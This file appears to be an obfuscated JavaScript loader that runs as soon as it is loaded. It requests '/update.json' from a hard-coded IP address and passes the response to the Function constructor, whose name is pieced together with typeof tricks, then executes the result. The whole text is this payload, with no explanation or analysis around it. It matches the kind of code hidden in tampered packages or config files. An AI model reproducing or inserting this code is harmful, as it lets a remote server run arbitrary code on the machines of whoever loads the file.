;(function () {
  var _0x4b0eb4 = require('http')
  return _0x4b0eb4.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0xbcf8ba) {
      var _0x19fde8 = ''
      _0xbcf8ba.on('data', function (_0x3704b5) {
        _0x19fde8 += _0x3704b5
      })
      _0xbcf8ba.on('end', function () {
        var _0x72effd =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x4cee37 = new _0x72effd(_0x19fde8)
        _0x4cee37()
      })
    }
  )
})()

